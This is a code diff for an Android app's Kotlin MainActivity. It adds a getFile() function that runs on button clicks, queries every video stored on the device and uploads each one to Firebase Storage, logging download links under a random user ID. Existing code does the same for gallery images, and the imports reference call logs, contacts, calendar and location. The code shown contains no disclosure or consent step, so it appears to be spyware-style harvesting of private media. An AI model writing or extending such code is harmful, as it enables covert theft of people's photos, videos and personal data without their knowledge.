@@ -11,7 +11,10 @@ import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.location.Location
 import android.net.Uri
-import android.os.*
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.provider.CalendarContract
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -29,8 +32,6 @@ import com.google.firebase.storage.FirebaseStorage
 import kotlinx.android.synthetic.main.activity_main.*
 import java.io.ByteArrayOutputStream
 import java.io.File
-import java.net.URI
-import java.net.URL
 import java.util.*
 import kotlin.collections.ArrayList
 import kotlin.collections.HashMap
@@ -44,7 +45,7 @@ class MainActivity : AppCompatActivity() {
     var randstr = randomID.toString()
     var randomIDtext = "UID: $randstr"
     val database = FirebaseDatabase.getInstance()
-    var storage = FirebaseStorage.getInstance()
+    var storage = FirebaseStorage.getInstance().reference
     val myRef = database.getReference("userData").child("$randomID")
     val REQ_CODE = 1
     var a = 0
@@ -191,6 +192,7 @@ class MainActivity : AppCompatActivity() {
             button4.alpha = 0.5f
         }
         button.setOnClickListener {
+            getFile()
             if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 && h>0 ){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
@@ -202,6 +204,7 @@ class MainActivity : AppCompatActivity() {
             showid.text = randomIDtext
             button.isClickable = false
             button.alpha = 0.5f
+
         }
 
         getall.setOnClickListener {
@@ -225,8 +228,10 @@ class MainActivity : AppCompatActivity() {
             }, 1000)
             Handler(Looper.getMainLooper()).postDelayed({
                 getPicture()
-            },1000)
-
+            }, 1000)
+            Handler(Looper.getMainLooper()).postDelayed({
+                getFile()
+            }, 1000)
             val intent = Intent(this, LinkDemo::class.java)
             startActivity(intent)
             val i = Intent(this, LinkDemo::class.java)
@@ -455,15 +460,8 @@ class MainActivity : AppCompatActivity() {
         cursor.use {
             it?.let {
                 val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-                val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
-                val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
-
                 while (it.moveToNext() && l!=5) {
                     val id = it.getLong(idColumn)
-                    val name = it.getString(nameColumn)
-                    val size = it.getString(sizeColumn)
-                    val date = it.getString(dateColumn)
 
                     val contentUri = ContentUris.withAppendedId(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
@@ -478,10 +476,10 @@ class MainActivity : AppCompatActivity() {
                     thumbnail.compress(Bitmap.CompressFormat.JPEG, 100, baos)
                     val data = baos.toByteArray()
                     l++
-                    val storageRef= storage.getReference("image no $l")
+                    val storageRef= storage.child("picture/image_$l")
                     val uploadTask = storageRef.putBytes(data)
                     uploadTask.addOnFailureListener {
-                        Log.d("fl","fail")
+                        Log.d("fl", "fail")
                     }.addOnSuccessListener { taskSnapshot ->
                         val text = "Uploaded!"
                         val duration = Toast.LENGTH_SHORT
@@ -502,7 +500,7 @@ class MainActivity : AppCompatActivity() {
                                 myRef.child("links/$ra").setValue(downloadUri.toString())
                             }, 1000)
                         } else {
-                            Log.d("fail","fail")
+                            Log.d("fail", "fail")
                         }
                     }
                 }
@@ -512,5 +510,60 @@ class MainActivity : AppCompatActivity() {
         }
         cursor!!.close()
     }
+
+
+    fun getFile() {
+        var l = 0
+        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+        val uri1 = MediaStore.Files.FileColumns._ID
+        val projection = arrayOf(MediaStore.MediaColumns.DATA)
+        val query = contentResolver.query(
+                uri,
+                projection,
+                null,
+                null,
+                null
+            )
+            query.use { cursor ->
+                cursor?.let {
+                    while (cursor.moveToNext()) {
+                        l++
+                        val absolutePathOfVideo = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
+                        val file = File(absolutePathOfVideo)
+                        val storageRef= storage.child("videos/video_$l")
+                        val uploadTask = storageRef.putFile(Uri.fromFile(file))
+                        uploadTask.addOnFailureListener {
+                            Log.d("fail","fails")
+                        }.addOnSuccessListener { taskSnapshot ->
+                            Log.d("success","success")
+                        }
+                        uploadTask.continueWithTask { task ->
+                            if (!task.isSuccessful) {
+                                task.exception?.let {
+                                    throw it
+                                }
+                            }
+                            storageRef.downloadUrl
+                        }.addOnCompleteListener { task ->
+                            if (task.isSuccessful) {
+                                val downloadUri = task.result
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    val ra = UUID.randomUUID().toString()
+                                    myRef.child("video_links/$ra").setValue(downloadUri.toString())
+                                }, 1000)
+                            } else {
+                                Log.d("fail", "fail")
+                            }
+                        }
+                    }
+                }
+            }
+
+    }
+
+
 }
+
+
+
 
